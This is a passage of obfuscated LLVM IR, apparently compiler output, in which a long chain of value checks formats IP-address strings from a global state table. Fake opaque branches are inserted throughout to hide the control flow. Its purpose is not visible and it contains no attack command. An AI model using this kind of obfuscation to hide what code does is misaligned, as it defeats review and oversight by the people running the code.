  br i1 %631, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %623
  %632 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %633 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %634 = zext i8 %633 to i32
  %635 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %636 = zext i8 %635 to i32
  %637 = call i32 (i8*, i8*, ...) @szprintf(i8* %632, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.71, i32 0, i32 0), i32 %634, i32 %636)
  %638 = load i32, i32* @x.75
  %639 = load i32, i32* @y.76
  %640 = sub i32 %638, 1
  %641 = mul i32 %638, %640
  %642 = urem i32 %641, 2
  %643 = icmp eq i32 %642, 0
  %644 = icmp slt i32 %639, 10
  %645 = or i1 %643, %644
  br i1 %645, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br label %646

; <label>:646:                                    ; preds = %originalBBpart276, %620
  %647 = load i32, i32* %1, align 4
  %648 = icmp eq i32 %647, 31
  br i1 %648, label %649, label %672

; <label>:649:                                    ; preds = %646
  %650 = load i32, i32* @x.75
  %651 = load i32, i32* @y.76
  %652 = sub i32 %650, 1
  %653 = mul i32 %650, %652
  %654 = urem i32 %653, 2
  %655 = icmp eq i32 %654, 0
  %656 = icmp slt i32 %651, 10
  %657 = or i1 %655, %656
  br i1 %657, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %649
  %658 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %659 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %660 = zext i8 %659 to i32
  %661 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %662 = zext i8 %661 to i32
  %663 = call i32 (i8*, i8*, ...) @szprintf(i8* %658, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.72, i32 0, i32 0), i32 %660, i32 %662)
  %664 = load i32, i32* @x.75
  %665 = load i32, i32* @y.76
  %666 = sub i32 %664, 1
  %667 = mul i32 %664, %666
  %668 = urem i32 %667, 2
  %669 = icmp eq i32 %668, 0
  %670 = icmp slt i32 %665, 10
  %671 = or i1 %669, %670
  br i1 %671, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %672

; <label>:672:                                    ; preds = %originalBBpart280, %646
  %673 = load i32, i32* %1, align 4
  %674 = icmp eq i32 %673, 32
  br i1 %674, label %675, label %682

; <label>:675:                                    ; preds = %672
  %676 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %677 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %678 = zext i8 %677 to i32
  %679 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %680 = zext i8 %679 to i32
  %681 = call i32 (i8*, i8*, ...) @szprintf(i8* %676, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.73, i32 0, i32 0), i32 %678, i32 %680)
  br label %682

; <label>:682:                                    ; preds = %675, %672
  %683 = load i32, i32* %1, align 4
  %684 = icmp eq i32 %683, 33
  br i1 %684, label %685, label %692

; <label>:685:                                    ; preds = %682
  %686 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %687 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %688 = zext i8 %687 to i32
  %689 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %690 = zext i8 %689 to i32
  %691 = call i32 (i8*, i8*, ...) @szprintf(i8* %686, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.74, i32 0, i32 0), i32 %688, i32 %690)
  br label %692

; <label>:692:                                    ; preds = %685, %682
  %693 = load i32, i32* %1, align 4
  %694 = icmp eq i32 %693, 34
  br i1 %694, label %695, label %718

; <label>:695:                                    ; preds = %692
  %696 = load i32, i32* @x.75
  %697 = load i32, i32* @y.76
  %698 = sub i32 %696, 1
  %699 = mul i32 %696, %698
  %700 = urem i32 %699, 2
  %701 = icmp eq i32 %700, 0
  %702 = icmp slt i32 %697, 10
  %703 = or i1 %701, %702
  br i1 %703, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %695
  %704 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %705 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %706 = zext i8 %705 to i32
  %707 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %708 = zext i8 %707 to i32
  %709 = call i32 (i8*, i8*, ...) @szprintf(i8* %704, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.75, i32 0, i32 0), i32 %706, i32 %708)
  %710 = load i32, i32* @x.75
  %711 = load i32, i32* @y.76
  %712 = sub i32 %710, 1
  %713 = mul i32 %710, %712
  %714 = urem i32 %713, 2
  %715 = icmp eq i32 %714, 0
  %716 = icmp slt i32 %711, 10
  %717 = or i1 %715, %716
  br i1 %717, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br label %718

; <label>:718:                                    ; preds = %originalBBpart284, %692
  %719 = load i32, i32* %1, align 4
  %720 = icmp eq i32 %719, 34
  br i1 %720, label %721, label %744

; <label>:721:                                    ; preds = %718
  %722 = load i32, i32* @x.75
  %723 = load i32, i32* @y.76
  %724 = sub i32 %722, 1
  %725 = mul i32 %722, %724
  %726 = urem i32 %725, 2
  %727 = icmp eq i32 %726, 0
  %728 = icmp slt i32 %723, 10
  %729 = or i1 %727, %728
  br i1 %729, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %721
  %730 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %731 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %732 = zext i8 %731 to i32
  %733 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %734 = zext i8 %733 to i32
  %735 = call i32 (i8*, i8*, ...) @szprintf(i8* %730, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.76, i32 0, i32 0), i32 %732, i32 %734)
  %736 = load i32, i32* @x.75
  %737 = load i32, i32* @y.76
  %738 = sub i32 %736, 1
  %739 = mul i32 %736, %738
  %740 = urem i32 %739, 2
  %741 = icmp eq i32 %740, 0
  %742 = icmp slt i32 %737, 10
  %743 = or i1 %741, %742
  br i1 %743, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br label %744

; <label>:744:                                    ; preds = %originalBBpart288, %718
  %745 = load i32, i32* %1, align 4
  %746 = icmp eq i32 %745, 35
  br i1 %746, label %747, label %770

; <label>:747:                                    ; preds = %744
  %748 = load i32, i32* @x.75
  %749 = load i32, i32* @y.76
  %750 = sub i32 %748, 1
  %751 = mul i32 %748, %750
  %752 = urem i32 %751, 2
  %753 = icmp eq i32 %752, 0
  %754 = icmp slt i32 %749, 10
  %755 = or i1 %753, %754
  br i1 %755, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %747
  %756 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %757 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %758 = zext i8 %757 to i32
  %759 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %760 = zext i8 %759 to i32
  %761 = call i32 (i8*, i8*, ...) @szprintf(i8* %756, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i32 0, i32 0), i32 %758, i32 %760)
  %762 = load i32, i32* @x.75
  %763 = load i32, i32* @y.76
  %764 = sub i32 %762, 1
  %765 = mul i32 %762, %764
  %766 = urem i32 %765, 2
  %767 = icmp eq i32 %766, 0
  %768 = icmp slt i32 %763, 10
  %769 = or i1 %767, %768
  br i1 %769, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br label %770

; <label>:770:                                    ; preds = %originalBBpart292, %744
  %771 = load i32, i32* %1, align 4
  %772 = icmp eq i32 %771, 36
  br i1 %772, label %773, label %796

; <label>:773:                                    ; preds = %770
  %774 = load i32, i32* @x.75
  %775 = load i32, i32* @y.76
  %776 = sub i32 %774, 1
  %777 = mul i32 %774, %776
  %778 = urem i32 %777, 2
  %779 = icmp eq i32 %778, 0
  %780 = icmp slt i32 %775, 10
  %781 = or i1 %779, %780
  br i1 %781, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %773
  %782 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %783 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %784 = zext i8 %783 to i32
  %785 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %786 = zext i8 %785 to i32
  %787 = call i32 (i8*, i8*, ...) @szprintf(i8* %782, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.78, i32 0, i32 0), i32 %784, i32 %786)
  %788 = load i32, i32* @x.75
  %789 = load i32, i32* @y.76
  %790 = sub i32 %788, 1
  %791 = mul i32 %788, %790
  %792 = urem i32 %791, 2
  %793 = icmp eq i32 %792, 0
  %794 = icmp slt i32 %789, 10
  %795 = or i1 %793, %794
  br i1 %795, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %796

; <label>:796:                                    ; preds = %originalBBpart296, %770
  %797 = load i32, i32* %1, align 4
  %798 = icmp eq i32 %797, 37
  br i1 %798, label %799, label %806

; <label>:799:                                    ; preds = %796
  %800 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %801 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %802 = zext i8 %801 to i32
  %803 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %804 = zext i8 %803 to i32
  %805 = call i32 (i8*, i8*, ...) @szprintf(i8* %800, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.79, i32 0, i32 0), i32 %802, i32 %804)
  br label %806

; <label>:806:                                    ; preds = %799, %796
  %807 = load i32, i32* @x.75
  %808 = load i32, i32* @y.76
  %809 = sub i32 %807, 1
  %810 = mul i32 %807, %809
  %811 = urem i32 %810, 2
  %812 = icmp eq i32 %811, 0
  %813 = icmp slt i32 %808, 10
  %814 = or i1 %812, %813
  br i1 %814, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %806
  %815 = load i32, i32* %1, align 4
  %816 = icmp eq i32 %815, 38
  %817 = load i32, i32* @x.75
  %818 = load i32, i32* @y.76
  %819 = sub i32 %817, 1
  %820 = mul i32 %817, %819
  %821 = urem i32 %820, 2
  %822 = icmp eq i32 %821, 0
  %823 = icmp slt i32 %818, 10
  %824 = or i1 %822, %823
  br i1 %824, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %816, label %825, label %832

; <label>:825:                                    ; preds = %originalBBpart2100
  %826 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %827 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %828 = zext i8 %827 to i32
  %829 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %830 = zext i8 %829 to i32
  %831 = call i32 (i8*, i8*, ...) @szprintf(i8* %826, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.80, i32 0, i32 0), i32 %828, i32 %830)
  br label %832

; <label>:832:                                    ; preds = %825, %originalBBpart2100
  %833 = load i32, i32* @x.75
  %834 = load i32, i32* @y.76
  %835 = sub i32 %833, 1
  %836 = mul i32 %833, %835
  %837 = urem i32 %836, 2
  %838 = icmp eq i32 %837, 0
  %839 = icmp slt i32 %834, 10
  %840 = or i1 %838, %839
  br i1 %840, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %832
  %841 = load i32, i32* %1, align 4
  %842 = icmp eq i32 %841, 39
  %843 = load i32, i32* @x.75
  %844 = load i32, i32* @y.76
  %845 = sub i32 %843, 1
  %846 = mul i32 %843, %845
  %847 = urem i32 %846, 2
  %848 = icmp eq i32 %847, 0
  %849 = icmp slt i32 %844, 10
  %850 = or i1 %848, %849
  br i1 %850, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %842, label %851, label %874

; <label>:851:                                    ; preds = %originalBBpart2104
  %852 = load i32, i32* @x.75
  %853 = load i32, i32* @y.76
  %854 = sub i32 %852, 1
  %855 = mul i32 %852, %854
  %856 = urem i32 %855, 2
  %857 = icmp eq i32 %856, 0
  %858 = icmp slt i32 %853, 10
  %859 = or i1 %857, %858
  br i1 %859, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %851
  %860 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %861 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %862 = zext i8 %861 to i32
  %863 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %864 = zext i8 %863 to i32
  %865 = call i32 (i8*, i8*, ...) @szprintf(i8* %860, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.81, i32 0, i32 0), i32 %862, i32 %864)
  %866 = load i32, i32* @x.75
  %867 = load i32, i32* @y.76
  %868 = sub i32 %866, 1
  %869 = mul i32 %866, %868
  %870 = urem i32 %869, 2
  %871 = icmp eq i32 %870, 0
  %872 = icmp slt i32 %867, 10
  %873 = or i1 %871, %872
  br i1 %873, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br label %874

; <label>:874:                                    ; preds = %originalBBpart2108, %originalBBpart2104
  %875 = load i32, i32* %1, align 4
  %876 = icmp eq i32 %875, 40
  br i1 %876, label %877, label %884

; <label>:877:                                    ; preds = %874
  %878 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %879 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %880 = zext i8 %879 to i32
  %881 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %882 = zext i8 %881 to i32
  %883 = call i32 (i8*, i8*, ...) @szprintf(i8* %878, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.82, i32 0, i32 0), i32 %880, i32 %882)
  br label %884

; <label>:884:                                    ; preds = %877, %874
  %885 = load i32, i32* %1, align 4
  %886 = icmp eq i32 %885, 41
  br i1 %886, label %887, label %894

; <label>:887:                                    ; preds = %884
  %888 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %889 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %890 = zext i8 %889 to i32
  %891 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %892 = zext i8 %891 to i32
  %893 = call i32 (i8*, i8*, ...) @szprintf(i8* %888, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.83, i32 0, i32 0), i32 %890, i32 %892)
  br label %894

; <label>:894:                                    ; preds = %887, %884
  %895 = load i32, i32* %1, align 4
  %896 = icmp eq i32 %895, 42
  br i1 %896, label %897, label %904

; <label>:897:                                    ; preds = %894
  %898 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %899 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %900 = zext i8 %899 to i32
  %901 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %902 = zext i8 %901 to i32
  %903 = call i32 (i8*, i8*, ...) @szprintf(i8* %898, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.84, i32 0, i32 0), i32 %900, i32 %902)
  br label %904

; <label>:904:                                    ; preds = %897, %894
  %905 = load i32, i32* %1, align 4
  %906 = icmp eq i32 %905, 43
  br i1 %906, label %907, label %914

; <label>:907:                                    ; preds = %904
  %908 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %909 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %910 = zext i8 %909 to i32
  %911 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %912 = zext i8 %911 to i32
  %913 = call i32 (i8*, i8*, ...) @szprintf(i8* %908, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.85, i32 0, i32 0), i32 %910, i32 %912)
  br label %914

; <label>:914:                                    ; preds = %907, %904
  %915 = load i32, i32* %1, align 4
  %916 = icmp eq i32 %915, 44
  br i1 %916, label %917, label %924

; <label>:917:                                    ; preds = %914
  %918 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %919 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %920 = zext i8 %919 to i32
  %921 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %922 = zext i8 %921 to i32
  %923 = call i32 (i8*, i8*, ...) @szprintf(i8* %918, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.86, i32 0, i32 0), i32 %920, i32 %922)
  br label %924

; <label>:924:                                    ; preds = %917, %914
  %925 = load i32, i32* %1, align 4
  %926 = icmp eq i32 %925, 45
  br i1 %926, label %927, label %934

; <label>:927:                                    ; preds = %924
  %928 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %929 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %930 = zext i8 %929 to i32
  %931 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %932 = zext i8 %931 to i32
  %933 = call i32 (i8*, i8*, ...) @szprintf(i8* %928, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.87, i32 0, i32 0), i32 %930, i32 %932)
  br label %934

; <label>:934:                                    ; preds = %927, %924
  %935 = load i32, i32* @x.75
  %936 = load i32, i32* @y.76
  %937 = sub i32 %935, 1
  %938 = mul i32 %935, %937
  %939 = urem i32 %938, 2
  %940 = icmp eq i32 %939, 0
  %941 = icmp slt i32 %936, 10
  %942 = or i1 %940, %941
  br i1 %942, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %934
  %943 = load i32, i32* %1, align 4
  %944 = icmp eq i32 %943, 46
  %945 = load i32, i32* @x.75
  %946 = load i32, i32* @y.76
  %947 = sub i32 %945, 1
  %948 = mul i32 %945, %947
  %949 = urem i32 %948, 2
  %950 = icmp eq i32 %949, 0
  %951 = icmp slt i32 %946, 10
  %952 = or i1 %950, %951
  br i1 %952, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %944, label %953, label %960

; <label>:953:                                    ; preds = %originalBBpart2112
  %954 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %955 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %956 = zext i8 %955 to i32
  %957 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %958 = zext i8 %957 to i32
  %959 = call i32 (i8*, i8*, ...) @szprintf(i8* %954, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.88, i32 0, i32 0), i32 %956, i32 %958)
  br label %960

; <label>:960:                                    ; preds = %953, %originalBBpart2112
  %961 = load i32, i32* @x.75
  %962 = load i32, i32* @y.76
  %963 = sub i32 %961, 1
  %964 = mul i32 %961, %963
  %965 = urem i32 %964, 2
  %966 = icmp eq i32 %965, 0
  %967 = icmp slt i32 %962, 10
  %968 = or i1 %966, %967
  br i1 %968, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %960
  %969 = load i32, i32* %1, align 4
  %970 = icmp eq i32 %969, 47
  %971 = load i32, i32* @x.75
  %972 = load i32, i32* @y.76
  %973 = sub i32 %971, 1
  %974 = mul i32 %971, %973
  %975 = urem i32 %974, 2
  %976 = icmp eq i32 %975, 0
  %977 = icmp slt i32 %972, 10
  %978 = or i1 %976, %977
  br i1 %978, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %970, label %979, label %1002

; <label>:979:                                    ; preds = %originalBBpart2116
  %980 = load i32, i32* @x.75
  %981 = load i32, i32* @y.76
  %982 = sub i32 %980, 1
  %983 = mul i32 %980, %982
  %984 = urem i32 %983, 2
  %985 = icmp eq i32 %984, 0
  %986 = icmp slt i32 %981, 10
  %987 = or i1 %985, %986
  br i1 %987, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %979
  %988 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %989 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %990 = zext i8 %989 to i32
  %991 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %992 = zext i8 %991 to i32
  %993 = call i32 (i8*, i8*, ...) @szprintf(i8* %988, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.89, i32 0, i32 0), i32 %990, i32 %992)
  %994 = load i32, i32* @x.75
  %995 = load i32, i32* @y.76
  %996 = sub i32 %994, 1
  %997 = mul i32 %994, %996
  %998 = urem i32 %997, 2
  %999 = icmp eq i32 %998, 0
  %1000 = icmp slt i32 %995, 10
  %1001 = or i1 %999, %1000
  br i1 %1001, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br label %1002

; <label>:1002:                                   ; preds = %originalBBpart2120, %originalBBpart2116
  %1003 = load i32, i32* %1, align 4
  %1004 = icmp eq i32 %1003, 48
  br i1 %1004, label %1005, label %1028

; <label>:1005:                                   ; preds = %1002
  %1006 = load i32, i32* @x.75
  %1007 = load i32, i32* @y.76
  %1008 = sub i32 %1006, 1
  %1009 = mul i32 %1006, %1008
  %1010 = urem i32 %1009, 2
  %1011 = icmp eq i32 %1010, 0
  %1012 = icmp slt i32 %1007, 10
  %1013 = or i1 %1011, %1012
  br i1 %1013, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %1005
  %1014 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1015 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1016 = zext i8 %1015 to i32
  %1017 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1018 = zext i8 %1017 to i32
  %1019 = call i32 (i8*, i8*, ...) @szprintf(i8* %1014, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.90, i32 0, i32 0), i32 %1016, i32 %1018)
  %1020 = load i32, i32* @x.75
  %1021 = load i32, i32* @y.76
  %1022 = sub i32 %1020, 1
  %1023 = mul i32 %1020, %1022
  %1024 = urem i32 %1023, 2
  %1025 = icmp eq i32 %1024, 0
  %1026 = icmp slt i32 %1021, 10
  %1027 = or i1 %1025, %1026
  br i1 %1027, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br label %1028

; <label>:1028:                                   ; preds = %originalBBpart2124, %1002
  %1029 = load i32, i32* %1, align 4
  %1030 = icmp eq i32 %1029, 49
  br i1 %1030, label %1031, label %1054

; <label>:1031:                                   ; preds = %1028
  %1032 = load i32, i32* @x.75
  %1033 = load i32, i32* @y.76
  %1034 = sub i32 %1032, 1
  %1035 = mul i32 %1032, %1034
  %1036 = urem i32 %1035, 2
  %1037 = icmp eq i32 %1036, 0
  %1038 = icmp slt i32 %1033, 10
  %1039 = or i1 %1037, %1038
  br i1 %1039, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %1031
  %1040 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1041 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1042 = zext i8 %1041 to i32
  %1043 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1044 = zext i8 %1043 to i32
  %1045 = call i32 (i8*, i8*, ...) @szprintf(i8* %1040, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.91, i32 0, i32 0), i32 %1042, i32 %1044)
  %1046 = load i32, i32* @x.75
  %1047 = load i32, i32* @y.76
  %1048 = sub i32 %1046, 1
  %1049 = mul i32 %1046, %1048
  %1050 = urem i32 %1049, 2
  %1051 = icmp eq i32 %1050, 0
  %1052 = icmp slt i32 %1047, 10
  %1053 = or i1 %1051, %1052
  br i1 %1053, label %originalBBpart2128, label %originalBB126alteredBB

originalBBpart2128:                               ; preds = %originalBB126
  br label %1054

; <label>:1054:                                   ; preds = %originalBBpart2128, %1028
  %1055 = load i32, i32* %1, align 4
  %1056 = icmp eq i32 %1055, 50
  br i1 %1056, label %1057, label %1080

; <label>:1057:                                   ; preds = %1054
  %1058 = load i32, i32* @x.75
  %1059 = load i32, i32* @y.76
  %1060 = sub i32 %1058, 1
  %1061 = mul i32 %1058, %1060
  %1062 = urem i32 %1061, 2
  %1063 = icmp eq i32 %1062, 0
  %1064 = icmp slt i32 %1059, 10
  %1065 = or i1 %1063, %1064
  br i1 %1065, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %1057
  %1066 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1067 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1068 = zext i8 %1067 to i32
  %1069 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1070 = zext i8 %1069 to i32
  %1071 = call i32 (i8*, i8*, ...) @szprintf(i8* %1066, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.92, i32 0, i32 0), i32 %1068, i32 %1070)
  %1072 = load i32, i32* @x.75
  %1073 = load i32, i32* @y.76
  %1074 = sub i32 %1072, 1
  %1075 = mul i32 %1072, %1074
  %1076 = urem i32 %1075, 2
  %1077 = icmp eq i32 %1076, 0
  %1078 = icmp slt i32 %1073, 10
  %1079 = or i1 %1077, %1078
  br i1 %1079, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %1080

; <label>:1080:                                   ; preds = %originalBBpart2132, %1054
  %1081 = load i32, i32* %1, align 4
  %1082 = icmp eq i32 %1081, 51
  br i1 %1082, label %1083, label %1090

; <label>:1083:                                   ; preds = %1080
  %1084 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1085 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1086 = zext i8 %1085 to i32
  %1087 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1088 = zext i8 %1087 to i32
  %1089 = call i32 (i8*, i8*, ...) @szprintf(i8* %1084, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.93, i32 0, i32 0), i32 %1086, i32 %1088)
  br label %1090

; <label>:1090:                                   ; preds = %1083, %1080
  %1091 = load i32, i32* %1, align 4
  %1092 = icmp eq i32 %1091, 52
  br i1 %1092, label %1093, label %1116

; <label>:1093:                                   ; preds = %1090
  %1094 = load i32, i32* @x.75
  %1095 = load i32, i32* @y.76
  %1096 = sub i32 %1094, 1
  %1097 = mul i32 %1094, %1096
  %1098 = urem i32 %1097, 2
  %1099 = icmp eq i32 %1098, 0
  %1100 = icmp slt i32 %1095, 10
  %1101 = or i1 %1099, %1100
  br i1 %1101, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %1093
  %1102 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1103 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1104 = zext i8 %1103 to i32
  %1105 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
